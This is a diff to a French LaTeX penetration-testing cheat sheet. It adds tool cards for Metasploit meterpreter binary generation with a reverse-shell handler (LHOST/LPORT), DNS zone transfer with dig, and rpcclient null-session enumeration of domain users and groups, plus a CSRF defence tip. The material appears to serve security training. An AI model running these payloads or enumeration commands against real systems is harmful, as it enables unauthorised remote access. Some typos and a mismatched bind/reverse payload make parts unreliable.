@@ -6060,7 +6060,7 @@ Pour sortir de la session : {\sl \color{blue}CTRL+C}\\
 \end{itemize}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\HACKfiche{}{Metasploit - Meterpreter}{metasploit.png}
+\HACKfiche{}{Metasploit - Meterpreter 1/2}{metasploit.png}
 {
 \url{http://www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training}\\
 \url{http://www.fastandeasyhacking.com}
@@ -6173,6 +6173,25 @@ Ici un URL (http://192.168.0.1) est g\'en\'er\'e, si une personne avec un naviga
 	 {\sl \color{blue}SET PAYLOAD  windows/meterpreter/reverse\_tcp}\\
 	 {\sl \color{blue}exploit}
 }
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\HACKfiche{}{Metasploit - Meterpreter 2/2}{metasploit.png}
+{\O
+}{
+\\Génératation de binairemeterpreter et exploitation.
+}{
+
+Génération d'un binaire meterpreter :\\
+\textbf{msf >} {\sl \color{blue}use windows/shell\_bind\_tcp}\\
+\textbf{msf payload(shell\_bind\_tcp) >} {\sl \color{blue}generate -t exe -f meterpreter\_binary.exe} (-h pour l'aide)\\
+
+Après exécution sur la machine à distance, se connecter dessus :\\
+\textbf{msf >} {\sl \color{blue}use exploit/multi/handler}\\
+\textbf{msf exploit(handler) >}{\sl \color{blue} set payload windows/meterpreter/reverse\_tcp}\\
+\textbf{msf exploit(handler) >}{\sl \color{blue} set LHOST 192.168.0.1}\\
+\textbf{msf exploit(handler) >}{\sl \color{blue} set LPORT 4444}\\
+\textbf{msf exploit(handler) >}{\sl \color{blue} exploit -j}\\
+}
+
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{Nagios}{nagios.png}
@@ -6652,7 +6671,7 @@ Le scan UDP peut \^etre tr\`es long (avec l'augmentation de probs), il est donc 
 {\sl \color{blue}nmap {-}{-}max-rtt-timeout 100ms {-}{-}max-retries 3 -sU  -p- IpMachineCible}\\
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\fiche{}{NsLookup et Host}{protocole.png}{\O}
+\fiche{}{NsLookup, Host et Dig}{protocole.png}{\O}
 {
 \\Outils (Unix/Linux, Windows et MacOS) permettant de lire les informations de serveurs DNS et d'effectuer du transfert de zone.\\
 Par d\'efaut la r\'esolution DNS est effectu\'ee via le port UDP 53, pour le transfert de zone qui a pour but une synchronisation entre 
@@ -6683,6 +6702,7 @@ que seules les serveurs soient autoriser \`a faire du transfert de zone entre eu
 
 \textbf{Lecture des informations du DNS \textit{pres.fr} : }\\
 {\sl \color{blue}host -a pres.fr 192.168.1.1}\\
+{\sl \color{blue}dig ns pres.fr}\\
 
 \textbf{Lister tous les serveurs de messagerie de \textit{pres.fr} : }\\
 {\sl \color{blue}nslookup -type=MX pres.fr}\\
@@ -6695,8 +6715,12 @@ Ici \textbf{server 192.168.1.1} d\'efinit le serveur DNS test\'e pour effectuer 
 {\sl \color{blue} server 192.168.1.1}\\
 {\sl \color{blue} ls -d pres.fr}\\
 
-\textbf{Transfert de zone  avec host  : }\\
+\textbf{Transfert de zone avec host et dig : }\\
 {\sl \color{blue}host -l pres.fr 192.168.1.1}\\
+{\sl \color{blue}dig @192.168.1.1 axfr pres.fr}\\
+
+\textbf{Réponses aux requêtes récursives : }\\
+{\sl \color{blue}dig +bufsize=2048 @192.168.1.1 ANY pres.fr}\\
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{OAT}{oracle.png}
@@ -6872,7 +6896,7 @@ Active perl : \url{http://www.activestate.com/Products/activeperl/index.mhtml}\v
 {\sl \color{blue}perl tnscmd.pl version -h Test -p 1521 {-}{-}indent}\\
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\fiche{}{PDF}{PDF.png}{\url{http://www.adobe.com/devnet/pdf/pdf_reference.html}, \url{http://isafepdf.codeplex.com/}}
+\fiche{}{PDF - Format}{PDF.png}{\url{http://www.adobe.com/devnet/pdf/pdf_reference.html}, \url{http://isafepdf.codeplex.com/}}
 {
 \\Portable Document Format, language de description de pages d'impression (cr\'e\'e par Adobe en 1993), ne d\'ependant pas du syst\`eme d'exploitation, 
 peut int\'egrer : polices d'\'ecritures, images, vid\'eos, objets graphiques, scripts\dots{}\\
@@ -7289,7 +7313,70 @@ iptables -A FORWARD -i at0 -j ACCEPT
 \item Firesheep : \url{http://codebutler.github.com/firesheep/}
 \end{itemize}
 }
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\HACKfiche{}{RPCclient}{rpcclient.png}
+{\url{http:\\www.samba.org}\\\url{http:\\www.samba-tng.org}}
+{
+\\Client RPC Linux pour service RPC Microsoft et Samba.
+}
+{
+Connexion en session nulle à un service MS-RPC/Samba :\\
+{\sl \color{blue}rpcclient -I 92.168.0.1 -U '\%' 192.168.0.1}\vskip+0.2cm
 
+Connexion avec un login et mot de passe (\%password est optionnel, dans ce cas il y a un invité pour saisir le mot de passe) :\\
+{\sl \color{blue}rpcclient -I 92.168.0.1 -U 'login\%password' 192.168.0.1}\vskip+0.2cm
+
+Informations du domaine et base SID :\\
+\textbf{rpcclient \$> }{\sl \color{blue}lsaquery}\vskip+0.2cm
+
+Version du système d'exploitation :\\
+\textbf{rpcclient \$>} {\sl \color{blue}srvinfo}\vskip+0.2cm
+
+Rôle du domaine :\\
+\textbf{rpcclient \$>} {\sl \color{blue}dsroledominfo}\vskip+0.2cm
+
+Informations globales du domaine :\\
+\textbf{rpcclient \$>} {\sl \color{blue}querydominfo}\vskip+0.2cm
+
+Description des comptes locaux :\\
+\textbf{rpcclient \$>} {\sl \color{blue}querydispinfo}\vskip+0.2cm
+
+Politique des comptes du domaine :\\
+\textbf{rpcclient \$>} {\sl \color{blue}querydominfo 12}\vskip+0.2cm
+
+Revers SID d'un compte (ici l'administrateur local) :\\
+\textbf{rpcclient \$>} {\sl \color{blue}lookupsids S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX-500}\vskip+0.2cm
+
+Liste des SID du domaine :\\
+\textbf{rpcclient \$>} {\sl \color{blue}lsaenumsid}\vskip+0.2cm
+
+Liste des utilisateurs du domaine :\\
+\textbf{rpcclient \$>} {\sl \color{blue}enumdomusers}\vskip+0.2cm
+
+Liste des Alias ou groupe d'un utilisateur :\\
+\textbf{rpcclient \$>} {\sl \color{blue}queryuseraliases builtin 500}\\
+\textbf{rpcclient \$>} {\sl \color{blue}queryusergroups 500}\vskip+0.2cm
+
+Liste tous les groupes (builtin ou domain) :\\
+\textbf{rpcclient \$>} {\sl \color{blue}enumalsgroups domain}\\
+\textbf{rpcclient \$>} {\sl \color{blue}enumdomgroups}\vskip+0.2cm
+
+Information sur un groupe :\\
+\textbf{rpcclient \$>} {\sl \color{blue}querygroup 0x220}\v\
+\textbf{rpcclient \$>} {\sl \color{blue}queryaliasmem builtin 0x220}\vskip+0.2cm
+
+Quitter le shell interactif :\\
+\textbf{rpcclient \$>} {\sl \color{blue}quit}\\
+
+Pour le client rpcclient TNG, certaines commandes n'existent pas ou ont d'autres équivalents. Il faut remplacer :
+\begin{itemize}
+	\item Informations du domaine : {\sl \color{red}lsaquery} => {\sl \color{blue}enumdomains}
+	\item Description des comptes locaux : {\sl \color{red}querydispinfo} => {\sl \color{blue}dispinfo} 
+	\item Informations sur le domaine : {\sl \color{red}querydominfo} => {\sl \color{blue}dominfo} 
+	\item Liste des utilisateurs du domaine : {\sl \color{red}enumdomusers} => {\sl \color{blue}enumusers} 
+\end{itemize}
+
+}
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \HACKfiche{}{Scapy}{scapy.png}
 {\url{http://www.secdev.org/projects/scapy/doc/installation.html}\\
@@ -7843,6 +7930,7 @@ actions \`a son insu (exemple : dans le cas d'un administrateur de forum).
 \vskip+0.4cm
 \textbf{Se prot\'eger :}
 \begin{description}
+   \item[$\Square$] ajouter un jeton limité à la transaction courante et le vérifier afin de valider la transaction;
    \item[$\Square$] toujours effectuer une validation (si le nombre de message le permet) des messages avant leur poste;
    \item[$\Square$] interdire les scripts (JavaScript/VBScript) ;
    \item[$\Square$] interdire l'ajout de liens ou d'images ;
@@ -8479,7 +8567,7 @@ Il faut cr\'eer un fichier de configuration personnalis\'e (exemple : {\sl \colo
 	git config {-}{-}global user.email <mail>
 	}	
 	\item Cr\'eer une copie locale : {\sl \color{blue}git clone <URL>}
-	\item Mettre \`a jour la copie locale : {\sl \color{blue}git checkout <URL>}
+	\item Mettre \`a jour la copie locale : {\sl \color{blue}git pull}
 	\item Ajouter/supprimer un fichier au d\'ep\^ot local : {\sl \color{blue} git add/delete <fichier>}
 	\item Appliquer les modifications sur le d\'ep\^ot original : {\sl \color{blue}git commit -m "description de la MAJ"}
 \end{itemize}
